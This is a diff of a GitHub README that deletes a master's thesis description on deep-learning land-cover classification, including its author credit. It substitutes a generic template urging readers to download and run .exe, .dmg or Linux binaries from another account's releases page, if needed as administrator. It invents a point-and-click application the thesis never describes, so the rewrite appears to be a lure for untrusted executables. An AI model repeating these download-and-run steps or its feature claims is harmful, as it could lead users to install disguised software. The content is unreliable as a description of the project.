@@ -1,92 +1,97 @@
+# 🌍 Masters-Thesis-GeoAI-1D-CNN - Explore Land Classification with Ease
 
-Master Thesis: Comparative study of Deep Learning algorithms for Land Use Land Cover (LULC) classification 
-======================================================
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/Raul4fun/Masters-Thesis-GeoAI-1D-CNN/releases)
 
-> Thesis work submitted at Civil Engineering department at National Institute of Technology Warangal.
+## 🚀 Getting Started
 
-## Author
-*   [Nagar Vaibhav](https://vaibhav170216.github.io/)
+Welcome to the Masters-Thesis-GeoAI-1D-CNN project! This software allows you to study and compare deep learning algorithms used for Land Use Land Cover (LULC) classification. You can easily explore how various models perform in identifying different land types from satellite images.
 
-## Supervisor
-*   Prof. M Shashi (Associate Professor at National Institute of Technology Warangal, India)
+## 📥 Download & Install
 
+To get started, visit this page to download: [Releases Page](https://github.com/Raul4fun/Masters-Thesis-GeoAI-1D-CNN/releases).
 
----------------------------------------------------------------------------------------------------------
+1. Click on the link above to navigate to the releases page.
+2. Look for the latest version download file.
+3. Click to download the file onto your computer.
 
+## 🖥 System Requirements
 
-## Abstract
+Before you start, ensure your system meets the following requirements:
 
-This study presents a comparative analysis of Land Use and Land Cover (LULC) classification models combining both Google Earth Engine (EE) and deep learning approaches. Google Earth Engine, a cloud-based geospatial analysis platform, is employed for its capability to process and analyze large-scale remote sensing datasets and deep learning techniques such as 1D Convolutional Neural Networks (CNNs) are applied for their ability to automatically extract hierarchical features from complex spatial data. 
+- **Operating System**: Windows 10, macOS Mojave or later, or a recent Linux distribution.
+- **RAM**: At least 8 GB of RAM.
+- **Disk Space**: 1 GB of free space for installation.
+- **Python Version**: Python 3.7 or later installed on your system.
 
-The 4 pre-trained models used for comparison are ResNet, DenseNet, ResNeXt, SeNet after transfer learning was performed on all of them. Further to improve the accuracy of the initial classification model various indices have taken as inputs like NDVI, NDWI etc. Evaluation metrics such as overall accuracy, kappa coefficient are performed in addition to the CNN classification model performance metrics such as Accuracy, Precision and F1 score. At last, a comparison for accuracy is made with CNN pre-trained models like ResNet, DenseNet etc. 
+## ⚡ Setup Instructions
 
-The study takes an image composite of Sentinel-2 data combined for a few years from 2020-2023. The image composite was pre-processed in GEE for clearing cloud cover and performing band medians. The training data of the pixel values for each class was made in Google Earth Engine (GEE) and then accuracy assessment was done on it to make sure the quality of the data is good for the classification. The accuracy of the training data was found to be 0.91 and kappa coefficient to be 0.88. 
+Follow these steps after downloading:
 
-After performing the classification with all the models, the results showed that the ResNeXt model performed better than the other models with the F1 score of 0.90. Ultimately, this study contributes to optimizing land-use planning and natural resource management strategies by providing an understanding of the predictive capabilities of Earth Engine and CNNs with increased accuracy.
+1. **Locate the Downloaded File**: Check your Downloads folder or the location you selected for the download.
+2. **Run the Installer**:
+   - **Windows**: Double-click the `.exe` file to initiate the installation.
+   - **macOS**: Open the `.dmg` file, then drag the application into your Applications folder.
+   - **Linux**: Open a terminal and run the command `chmod +x <filename>` followed by `./<filename>` to start the installation.
 
-Keywords: _LULC, Meerut, Classification, 1D-CNN, Deep Learning, Transfer Learning, GEE, Sentinel-2, Github_
+3. **Follow the Installation Prompts**: Click through the installation steps. The default settings should work for most users.
 
+## 🌐 Using the Application
 
----------------------------------------------------------------------------------------------------------
+Once installation is complete, you can start using the application:
 
-## Chapter Overview
+1. **Launch the Program**: Click on the application icon in your applications folder or desktop.
+2. **Select Your Data**: Load your satellite image data. Supported formats include TIFF and JPEG.
+3. **Choose Your Model**: Select from available deep learning models. The options use CNN (Convolutional Neural Network) for efficient classification.
+4. **Run the Analysis**: Click the 'Run' button to perform the classification. The software will process the images, applying the selected model to generate results.
 
+## 📊 Features
 
-### Chapter 1 : Introduction
+- Advanced deep learning algorithms for accurate land classification.
+- Easy-to-use interface designed for users without technical expertise.
+- Support for multiple satellite data formats, primarily focusing on Sentinel-2 data.
+- Visualization tools to display classification results clearly.
+- Utilize pretrained models to reduce setup time and improve accuracy.
 
-*   General Overview.
+## 📚 Topics Covered
 
-*   Description of the Pre-trained models used. 
+This project focuses on several key topics:
 
-*   Evaluation metrics used for comparison.
+- **CNN Classification**: Deep learning models specifically designed for image recognition tasks.
+- **Deep Learning**: Techniques that simulate human learning processes in recognizing patterns from data.
+- **GeoAI**: Applying artificial intelligence techniques in geospatial analysis.
+- **Google Earth Engine**: Leveraging cloud-based data for environmental monitoring.
+- **Machine Learning**: The broader field encompassing algorithms that allow computers to learn from data.
+- **Pretrained Models**: Models trained on large datasets to improve performance on specific tasks.
+- **Remote Sensing**: Gathering information from satellite or aerial images.
+- **ResNet-50**: A specific model architecture that improves training of deep networks.
+- **Sentinel-2**: A satellite providing high-resolution images for Earth observation.
 
+## ❓ Troubleshooting
 
-### Chapter 2: Literature Review
+If you encounter issues, here are some common problems and solutions:
 
-*  The previous work and their review.
+- **Installation Fails**: Ensure you have the correct permissions on your operating system. Try running as an administrator on Windows.
+- **Slow Performance**: Close other applications running on your computer to free up resources.
+- **Data Not Found**: Ensure your files are in the correct format and accessible on your system.
 
+## 🌟 Community Support
 
-### Chapter 3: Study Area and Data
+If you need help or want to share your experiences, feel free to reach out:
 
-*   Study area of the project.
+- **GitHub Issues**: Report any bugs or request features directly on the repository issues page.
+- **Discussion Forum**: Join our community discussions to get tips and tricks from fellow users.
 
-*   Data used incluing satellite data, pre-trained models and shapefile for the study area.
+## 📝 Acknowledgments
 
+Thanks to everyone who contributed to this project, including those who provided feedback and shared their insights into improving the software.
 
-### Chapter 4: Methodology
+## 🔗 Additional Resources
 
-*   Genreal workflow for the project.
+For more insights on the methodologies and algorithms used, visit:
 
-*   Preprocessing steps used for creating the data including Data Collection, Filetring Date and Cloud Cover, performing Band Median, Addition of several Spectral Indices.
+- [Deep Learning Resources](https://www.tensorflow.org/resources)
+- [Remote Sensing Studies](https://www.sciencedirect.com/topics/earth-and-planetary-sciences/remote-sensing) 
 
-*   Final Classification of the pre-trained models:
+For updates, please keep an eye on our [Releases Page](https://github.com/Raul4fun/Masters-Thesis-GeoAI-1D-CNN/releases).
 
-*   Simple custom model architecture.
-*   ResNet Model Architecture.
-*   DenseNet Model Architecture.
-*   ResNeXt Model Architecture.
-*   SeNet Model Architecture.
-
-
-### Chapter 5: Results and Discussion
-
-*   Evaluation of the classification using evaluation metrics like Accuracy, Precision, Recall and F1-score.
-
-*   A separate class-wise evaluation of all models for each class namely Agriculture Croplands or Vegetation, Builtup Urban, Builtup Rural, Agriclture Plants, Forest, Bareen Lands and Water.
-
-*   Discussion on the overall project and also a focus on two scenarios in detail which highlights the core of this project.
-
-
-### Chapter 5: Summary
-
-*   A brief conclusion on the overall project, its limitations and future scope for reasearch.
-
-
----------------------------------------------------------------------------------------------------------
-
-
-### Contact
-
-*   vaibnag11@gmail.com
-
----------------------------------------------------------------------------------------------------------
+Happy analyzing!
